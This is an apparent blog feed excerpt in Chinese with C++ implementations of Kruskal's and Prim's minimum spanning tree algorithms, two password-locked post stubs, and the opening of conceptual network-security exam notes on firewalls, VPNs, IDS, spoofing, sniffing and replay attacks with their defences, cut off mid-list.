        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>　　 给定一个无向图，如果它任意两个顶点都联通并且是一棵树，那么我们就称之为生成树(Spanning Tree)。如果是带权值的无向图，那么权值之和最小的生成树，我们就称之为最小生成树(MST, Minimum Spanning Tree)。</p><p>　　常见求解最小生成树的算法有Kruskal算法和Prim算法，两者都是运用贪心的思路。两者区别：Prim在稠密图中比Kruskal优，在稀疏图(一般我们认为满足$E &lt; V*(V-1)/4$)中比Kruskal劣；Prim是以更新过的节点的连边找最小值，Kruskal是直接将边排序。</p><p><strong>注意</strong>：</p><ol><li>最小生成树可能有多个，但边的权值之和总是唯一且最小的</li><li>最小生成树的<code>边数=顶点数-1</code>。砍掉一条则不连通，增加一条边则会出现回路</li><li>如果一个连通图本身就是一棵树，则其最小生成树就是它本身</li><li>只有连通图才有生成树，非连通图只有生成森林</li></ol><h1 id="1-Kruskal算法"><a href="#1-Kruskal算法" class="headerlink" title="1 Kruskal算法"></a>1 Kruskal算法</h1><p>　　Kruskal算法是基于贪心的思想得到的。首先我们把所有的边按照权值先从小到大排列，接着按照顺序选取每条边，如果这条边的两个端点不属于同一集合（两点是否连通），那么就将它们合并，直到所有的点都属于同一个集合为止（所有结点连通）。</p><p>　　<strong>时间复杂度</strong>：Kruskal算法每次要从都要从剩余的边中选取一个最小的边。通常我们要先对边按权值从小到大排序，这一步的时间复杂度为$O(ElogE)$。Kruskal算法的实现通常使用并查集，来快速判断两个顶点是否属于同一个集合。最坏的情况可能要枚举完所有的边，此时要循环$E$次，所以这一步的时间复杂度为$O(E*α(V))$，其中$α$为Ackermann函数，其增长非常慢，我们可以视为常数。所以Kruskal算法的时间复杂度为$O(ElogE)$。</p><ul><li>参考：<a href="https://blog.csdn.net/luomingjun12315/article/details/47700237/" target="_blank" rel="noopener">https://blog.csdn.net/luomingjun12315/article/details/47700237/</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">5e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> n, v;       <span class="comment">// n是点数，v是边数</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span><span class="comment">// 存储边</span></span><br><span class="line">    <span class="keyword">int</span> a, b, w;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt; (<span class="keyword">const</span> Edge &amp;W)<span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> w &lt; W.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;edges[maxv];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> node[maxn];<span class="comment">//并查集的父节点数组</span></span><br><span class="line"><span class="keyword">int</span> Rank[maxn];<span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        node[i] = i;</span><br><span class="line">        Rank[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//路径压缩</span></span><br><span class="line"><span class="comment">//查找当前元素所在树的根节点(代表元素)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == node[x])</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> node[x] = find(node[x]);<span class="comment">//在第一次查找时，将节点直连到根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按秩合并</span></span><br><span class="line"><span class="comment">//合并x和y所在的集合</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root_x = find(x);<span class="comment">//找到根节点</span></span><br><span class="line">    <span class="keyword">int</span> root_y = find(y);</span><br><span class="line">    <span class="keyword">if</span> (root_x == root_y)<span class="comment">//两者根节点相同</span></span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="comment">//判断两棵树的高度，然后在决定谁为子树</span></span><br><span class="line">    <span class="keyword">if</span> (Rank[root_x] &lt; Rank[root_y])</span><br><span class="line">        node[root_x] = root_y;<span class="comment">//将x的根节点接到y的根节点下</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        node[root_y] = root_x;<span class="comment">//将y的根节点与x的根节点下</span></span><br><span class="line">        <span class="keyword">if</span> (Rank[root_x] == Rank[root_y])<span class="comment">//树的高度相同</span></span><br><span class="line">            Rank[root_x]++;<span class="comment">//root_x树高度+1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断xy是否属于一个集合</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> find(x) == find(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kruskal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    sort(edges, edges + v);</span><br><span class="line"></span><br><span class="line">    init(n);  <span class="comment">// 初始化并查集</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v; i ++ ) &#123;</span><br><span class="line">        <span class="keyword">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;</span><br><span class="line"></span><br><span class="line">        a = find(a), b = find(b);</span><br><span class="line">        <span class="keyword">if</span> (a != b) &#123;<span class="comment">// 如果两个连通块不连通，</span></span><br><span class="line">            merge(a, b);<span class="comment">//则将这两个连通块合并</span></span><br><span class="line">            res += w;</span><br><span class="line">            cnt ++ ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cnt &lt; n - <span class="number">1</span>) <span class="keyword">return</span> inf;<span class="comment">//原图不连通 </span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-Prim算法"><a href="#2-Prim算法" class="headerlink" title="2 Prim算法"></a>2 Prim算法</h1><p><strong>思想</strong>：</p><p>从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有顶点都纳入为止。</p><p><strong>时间复杂度</strong>：</p><div class="table-container"><table><thead><tr><th style="text-align:center">最小边、权的数据结构</th><th style="text-align:center">时间复杂度（总计）</th></tr></thead><tbody><tr><td style="text-align:center">邻接矩阵、搜索</td><td style="text-align:center">$O(V^2)$</td></tr><tr><td style="text-align:center">二叉堆、邻接表</td><td style="text-align:center">$O((V + E) log(V)) = O(E log(V))$</td></tr><tr><td style="text-align:center">斐波那契堆、邻接表</td><td style="text-align:center">$O(E + V log(V))$</td></tr></tbody></table></div><p><strong>流程</strong>：</p><p>输入：一个加权连通图，其中顶点集合为$V$，边集合为$E$<br>输出：使用集合$Vnew$和$Enew$来描述所得到的最小生成树</p><p>从单一顶点开始，Prim算法按照以下步骤逐步扩大树中所含顶点的数目，直到遍及连通图的所有顶点。</p><ol><li>初始化：$Vnew = {x}$，其中$x$为集合$V$中的任一节点(起始点)，$Enew = {}$；</li><li>重复下列操作，直到$Vnew = V$:<ol><li>在集合$E$中选取权值最小的边$(u, v)$，其中$u$为集合$Vnew$中的元素，而$v$则是$V$中没有加入$Vnew$的顶点（如果存在有多条满足前述条件即具有相同权值的边，则可任意选取其中之一）；</li><li>将$v$加入集合$Vnew$中，将$(u, v)$加入集合$Enew$中。</li></ol></li></ol><ul><li>参考：<a href="https://blog.csdn.net/luomingjun12315/article/details/47859993" target="_blank" rel="noopener">https://blog.csdn.net/luomingjun12315/article/details/47859993</a></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;      <span class="comment">// n表示点数</span></span><br><span class="line"><span class="keyword">int</span> g[maxn][maxn]; <span class="comment">// 邻接矩阵，存储所有边，编号从1开始 </span></span><br><span class="line"><span class="keyword">int</span> dist[maxn];    <span class="comment">// 存储其他点到当前最小生成树的距离</span></span><br><span class="line"><span class="keyword">bool</span> st[maxn];     <span class="comment">// 存储每个点是否已经在生成树中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果图不连通，则返回INF(值是0x3f3f3f3f), 否则返回最小生成树的树边权重之和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) &#123;</span><br><span class="line">    <span class="comment">//寻找代价最小的新顶点 </span></span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line"><span class="comment">//原图不连通 </span></span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; dist[t] == inf) <span class="keyword">return</span> inf;</span><br><span class="line"><span class="comment">//加点 </span></span><br><span class="line">        <span class="keyword">if</span> (i) res += dist[t];</span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//更新dist </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ ) dist[j] = min(dist[j], g[t][j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href="https://ac.nowcoder.com/acm/problem/15108" target="_blank" rel="noopener">牛客——道路建设</a></li><li><a href="https://ac.nowcoder.com/acm/problem/17509" target="_blank" rel="noopener">牛客——挖沟</a></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>202104华为招聘面试流程</title>
      <link href="/2021/04/07/202104%E5%8D%8E%E4%B8%BA%E5%AE%9E%E4%B9%A0%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/04/07/202104%E5%8D%8E%E4%B8%BA%E5%AE%9E%E4%B9%A0%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！请检查后重试~" data-whm="解密出现了一点问题，你仍可以看一看。">  <script id="hbeData" type="hbeData" data-hmacdigest="12c0d60781b1b22badb4bd17704d5b688aa3714361c29f2dee328273c43a8f5a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码以阅读这篇私密文章。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 华为 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验</title>
      <link href="/2021/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！请检查后重试~" data-whm="解密出现了一点问题，你仍可以看一看。">  <script id="hbeData" type="hbeData" data-hmacdigest="8404a63b911bfd0ddbb6b926684bc76ac9dfb8cb64d0345e0caf710f8dc59484"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码以阅读这篇私密文章。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全</title>
      <link href="/2021/03/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E8%AF%95/"/>
      <url>/2021/03/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Part-1-复习重点"><a href="#Part-1-复习重点" class="headerlink" title="Part 1 复习重点"></a><center><font color="#DC143C">Part 1 复习重点</font></center></h1><h1 id="Ch1-网络安全基础"><a href="#Ch1-网络安全基础" class="headerlink" title="Ch1 网络安全基础"></a>Ch1 网络安全基础</h1><h2 id="1-1-网络安全的总的目标"><a href="#1-1-网络安全的总的目标" class="headerlink" title="* 1.1 网络安全的总的目标"></a>* 1.1 网络安全的总的目标</h2><p>保证信息的机密性、完整性、不可否认性和可用性。</p><ul><li>机密性：可以通过加密来处理；<code>截取</code></li><li>完整性：不允许数据在传输过程中被修改；<code>修改</code></li><li>不可否认性：防止时候抵赖，可以通过数字签名解决；``</li><li>可用性：通过冗余方式。<code>中断</code></li></ul><h2 id="1-2-防范技术-主流网络安全技术"><a href="#1-2-防范技术-主流网络安全技术" class="headerlink" title="* 1.2 防范技术(主流网络安全技术)"></a>* 1.2 防范技术(主流网络安全技术)</h2><p><strong>Step1</strong>：身份认证，人体生物特征</p><p><strong>Step2</strong>：访问控制：自主、强制、RBAC</p><p><strong>Step3</strong>：防火墙—锁，内外隔离：集中式防火墙—&gt;分布式—&gt;嵌入式包过滤</p><p>双宿主主机网关：proxy，其工作原理：减少IP地址，加速，审计，访问控制</p><p>屏蔽子网防火墙：堡垒主机</p><p>集中式防火墙的缺陷</p><p>分布式防火墙的提出，所解决的问题</p><p><strong>Step4</strong>：VPN（三种情况，判断各种场合应该采用哪种方式）：保证跨越公网传输的安全性</p><p>Remote access VPN：PPTP/L2TP</p><p>Intranet VPN：IPSec，开放框架，AH，ESP，IKE</p><p>Extranet VPN：Socks v5</p><p><strong>Step5</strong>：IDS：IDS是检测机制</p><p>异常检测</p><p>误用检测</p><p>误报率、漏报率</p><p>类型：基于主机的IDS，其分析的内容；基于网络的IDS，其分析的内容</p><hr><ul><li>认证技术包括消息认证和身份鉴别。身份认证，人体生物特征</li><li><strong>访问控制</strong>保证网络资源不被非法使用和访问。自主、强制、RBAC</li><li><strong>防火墙</strong>技术是将内部网与外部网之间的访问进行全面控制的一种机制。防火墙—锁，内外隔离：集中式防火墙—&gt;分布式—&gt;嵌入式包过滤</li><li>数字签名技术主要用以保证数据的完整性、有效性和不可抵赖性等。</li><li>数据和网络<strong>备份、恢复</strong>也属于网络安全的支撑技术范围</li><li>PKI (Public Key Infrastructure)是遵循既定标准的密钥管理平台,它能够为所有网络应用提供加密和数字签名等密码服务及所必需的密钥和证书管理体系。</li><li>VPN（Virtual Private Network）技术利用不可信的公网资源建立可信的虚拟专用网，是保证局域网间通信安全的少数可行方案之一。</li><li><strong>入侵检测</strong>技术是一种主动保护自己的网络和系统免遭非法攻击的网络安全技术。</li><li><strong>反病毒</strong>技术是查找和清除计算机病毒的主要技术，其原理就是在杀毒扫描程序中嵌入病毒特征码引擎，然后根据病毒特征码数据库来进行对比式查杀。这种方法简单、有效，但只适用于已知病毒，并且其特征库需要不断升级。</li><li><strong>网络隔离</strong>技术通过特殊硬件实现链路层的断开，使得各种网络攻击与入侵失去了物理通路的基础，从而避免了内部网络遭受外部攻击的可能性。</li><li>系统和网络的<strong>扫描和评估</strong>：可帮助识别检测对象的系统资源，分析被攻击的可能指数，了解支撑系统本身的脆弱性，评估所有存在的安全风险。一些非常重要的专业应用网络，例如银行，不能承受一次入侵带来的损失，对扫描和评估技术有强烈的需求。</li><li><strong>监控</strong>和<strong>审计</strong>是与网络管理直接挂钩的技术</li><li><strong>安全套接层</strong>（SSL，Secure Socket Layer）协议是由Netscape公司1994年设计开发的安全协议，主要在传输层提高应用程序之间的数据安全性。SSL协议保证任何安装了安全套接层的C/S间的事务安全，提供了客户端和服务器的鉴别、数据完整性及信息机密性等安全服务。SSL采用在建立连接过程中采用公开密钥；在会话过程中使用对称密钥。加密的类型和强度由两端建立连接时协商决定。</li><li>HTTPS是建立于SSL上的HTTP安全协议，利用SSL加强HTTP协议的安全性，已经成功应用于电子商务。</li></ul><h2 id="1-3-信息安全保障体系组成-PDRR"><a href="#1-3-信息安全保障体系组成-PDRR" class="headerlink" title="1.3 信息安全保障体系组成(PDRR)"></a>1.3 信息安全保障体系组成(PDRR)</h2><ul><li>保护（Protect）:采用可能采取的手段保障信息的保密性、完整性、可用性、可控性和不可否认性。</li><li>检测（Detect）:利用高技术提供的工具检查系统存在的可能提供黑客攻击、白领犯罪、病毒泛滥的脆弱性。</li><li>反应（React）:对危及安全的事件、行为、过程及时作出响应处理，杜绝危害的进一步蔓延扩大，力求系统尚能提供正常服务。</li><li>恢复（Restore）:一旦系统遭到破坏，尽快恢复系统功能，尽早提供正常的服务。</li></ul><h2 id="1-4-网络体系结构的深入理解、各层加密的作用"><a href="#1-4-网络体系结构的深入理解、各层加密的作用" class="headerlink" title="* 1.4 网络体系结构的深入理解、各层加密的作用"></a>* 1.4 网络体系结构的深入理解、各层加密的作用</h2><p><img height="330" width="495" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/1.jpg" class="lozad"></p><ul><li>物理层， 只支持数据保密服务，保证信息流安全；</li><li>链路层， 只支持数据保密服务，实现链路层的面向连接和无连接两种服务的加密；</li><li>网络层， 对等实体认证服务、访问控制服务、数据保密服务、数据完整性服务、数据源点认证服务等；</li><li>会话层， 不提供安全服务；</li><li>表示层， 除信息流安全服务、有恢复连接完整性和无恢复连接完整性之外所有其他服务；</li><li>应用层， 原则上能够支持所有安全服务。 </li></ul><h2 id="1-5-帧、IP报文、TCP报文、UDP报文格式"><a href="#1-5-帧、IP报文、TCP报文、UDP报文格式" class="headerlink" title="* 1.5 帧、IP报文、TCP报文、UDP报文格式"></a>* 1.5 帧、IP报文、TCP报文、UDP报文格式</h2><p>帧首部：目的MAC地址(6Bytes) + 源MAC地址(6Bytes) + Type(2Bytes，IPv4-0x0800)</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/6.png" class="lozad"></p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/12.png" class="lozad"></p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/1806965-20191129104148482-792923521.png" class="lozad"></p><h1 id="Ch2-常见的网络攻击技术"><a href="#Ch2-常见的网络攻击技术" class="headerlink" title="Ch2 常见的网络攻击技术"></a>Ch2 常见的网络攻击技术</h1><h2 id="2-1-网络攻击"><a href="#2-1-网络攻击" class="headerlink" title="2.1 网络攻击"></a>2.1 网络攻击</h2><h3 id="2-1-1-目的"><a href="#2-1-1-目的" class="headerlink" title="2.1.1 目的"></a>2.1.1 目的</h3><ol><li>窃取信息</li><li>控制中间站点</li><li>获取超级用户的权限</li></ol><h3 id="2-1-2-来源"><a href="#2-1-2-来源" class="headerlink" title="2.1.2 来源"></a>2.1.2 来源</h3><ol><li>网络协议存在大量漏洞<ul><li>网络层核心协议 IP 以分组转发的方式从源主机向目的主机传送数据，在整个过程中网络上传输的都是明文的数据，并且它仅依赖 IP 地址来验证源主机和目的主机，缺乏更有效的安全认证和保密机制；</li><li>在传输层提供TCP和UDP两种协议，面向连接的TCP在建立连接时虽然采用了“三次握手”的机制，但 TCP 连接也能被欺骗、截取和操纵；</li><li>UDP 协议则更容易受到 IP 源路由和拒绝服务的攻击；  </li><li>应用层的 Finger、 FTP、 Telnet、 SMTP、 DNS、 SNMP、 HTTP 等协议也都存在着与安全有关的认证、访问控制、完整性、保密性等问题；</li></ul></li><li>网络操作系统的漏洞 </li><li>应用系统设计的漏洞  </li><li>网络系统设计的漏洞  </li><li>来自网络的恶意攻击不断  </li><li>来自合法用户的攻击  </li></ol><p>互联网的开放性是导致网络安全威胁最根本的原因。  </p><h3 id="2-1-3-方法"><a href="#2-1-3-方法" class="headerlink" title="2.1.3 方法"></a>2.1.3 方法</h3><p>根据攻击针对的 TCP/IP 参考模型的不同层次，可分为：</p><ol><li>数据链路层攻击  </li><li>网络层攻击  </li><li>传输层攻击  </li><li>应用层攻击  </li></ol><p>根据攻击时是否主动修改信息，可分为：  </p><ol><li>被动攻击（Passive Attack） ：被动攻击是指攻击者只是监视着被攻击方的通信，但不进行任何篡改、拦截，通常被攻击方不易察觉。具体方法如下：<ul><li>窃听：采用嗅探软件 Sniffer，或直接 wiretapping（搭线窃听）  </li><li>流量分析（ Traffic analysis ）：通过对通信业务流的观察（出现、消失、总量、方向与频度）推断出有用的信息，比如主机的位置，业务的变化等等。  </li></ul></li><li>主动攻击（Active Attack）：主动攻击则是攻击者通过将一些恶意代码（Malicious Mobile Code），如病毒（Virus） 、蠕虫（Worm）、特洛伊木马（trojan）、恶意脚本（ Java Script, Java Applet, Active X 等）<br>放入受害者的主机，从而达到自己目的的行为，如删除受害者资料、盗取受害者账号和密码、篡改或虚构信息欺诈、对自身行为抵赖（repudiation）等。通常主动攻击的后果更为直接也更严重。  </li></ol><h3 id="2-1-4-过程"><a href="#2-1-4-过程" class="headerlink" title="2.1.4 过程"></a>2.1.4 过程</h3><ol><li>确定目标  </li><li>搜集与攻击目标相关的信息，并找出系统的安全漏洞  </li><li>实施攻击  </li></ol><h2 id="2-2-物理层和数据链路层"><a href="#2-2-物理层和数据链路层" class="headerlink" title="2.2 物理层和数据链路层"></a>2.2 物理层和数据链路层</h2><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-15_23-30-25.png" class="lozad"></p><h3 id="2-2-1-MAC地址欺骗"><a href="#2-2-1-MAC地址欺骗" class="headerlink" title="2.2.1 MAC地址欺骗"></a>2.2.1 MAC地址欺骗</h3><h4 id="2-2-1-1-原理"><a href="#2-2-1-1-原理" class="headerlink" title="2.2.1.1 原理"></a>2.2.1.1 原理</h4><p>以太网卡的 MAC 地址在系统初始化时被读入寄存器，发送数据帧时自动作为源物理地址，在接收到数据帧时同样自动比较该物理地址与数据帧的目的物理地址。因此，如果通过底层的 I/O 操作修改寄存器中的 MAC 地址，即把机器的 MAC 地址改为其它被信任的友好主机的 MAC 地址，就可以以其友好主机的身份与其他主机通信，这就是“MAC 地址欺骗”。有多种方法来修改 MAC 地址：  </p><ol><li>直接修改网卡 MAC 地址  </li><li>利用 MAC 地址克隆  </li></ol><h4 id="2-2-1-2-防范"><a href="#2-2-1-2-防范" class="headerlink" title="2.2.1.2 防范"></a>2.2.1.2 防范</h4><ul><li>追踪综合布线以确定没有非授权的机器挂接在网络上；</li><li>确保线路上已授权的机器使用自身的MAC地址，即配置MAC地址和端口的映射。</li></ul><h3 id="2-2-2-电磁信息泄露"><a href="#2-2-2-电磁信息泄露" class="headerlink" title="2.2.2 电磁信息泄露"></a>2.2.2 电磁信息泄露</h3><p>电磁信息泄漏：指电子设备的杂散（寄生）电磁能量通过导线或空间向外扩散。</p><p><strong>防范</strong>：</p><ul><li>只有强度和信噪比满足一定条件的信号才能够被截获和还原。因此，只要采取措施，弱化泄漏信号的强度，减小泄漏信号的信噪比，就可以达到电磁防护的目的。</li><li>电磁防护措施：屏蔽、滤波、隔离、合理的接地与良好的搭接、选用低泄漏设备、合理的布局和使用干扰器等。</li></ul><h3 id="2-2-3-网络监听"><a href="#2-2-3-网络监听" class="headerlink" title="2.2.3 网络监听"></a>2.2.3 网络监听</h3><p>网络监听是指获取在网络上传输的、并非发给自己计算机的信息。  </p><ul><li>传统以太网：共享信道，任何主机发送的每一个以太网帧都会到达别的与该主机处于同一网段的所有主机的以太网接口。</li><li>使用CSMA/CD协议时，以太网接口在检测到目的MAC不是自己的数据帧时，直接忽略，不交给上层协议。</li><li>使一个以太网接口接收不属于它的数据帧: 设置为混杂模式，使用socket API时通过setsockopt函数进行设置。</li></ul><p><strong>防范</strong>：网络分段，利用交换器、动态集线器和桥等设备对数据流进行限制，链路层加密和禁用混杂模式的节点等。</p><p><strong>工具</strong>：</p><ol><li>Snoop 监听工具  </li><li>Sniffit 监听工具  </li><li>Sniffer 监听工具  </li></ol><p><strong>防止网络监听</strong>：防止各种监听程序对网络的监听也有多种方法，如加密传输、采用安全拓扑结构等，但系统开销会比较大。  </p><h3 id="2-2-4-重放攻击"><a href="#2-2-4-重放攻击" class="headerlink" title="2.2.4 重放攻击"></a>2.2.4 重放攻击</h3><p>重放攻击（Replay Attacks）又称重播攻击、回放攻击或新鲜性攻击（Freshness Attacks）等，是指攻击者向目的主机（A）发送一个或多个 A 已接收过的包（特别是在认证的过程中，用于认证用户身份所接收的包，这个包往往是其他主机所发出的合法认证包）。重放攻击会不断恶意或欺诈性地重复发起一个有效的数据传输，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的安全性。</p><p><strong>防范</strong>：</p><ol><li><strong>挑战-应答机制</strong>  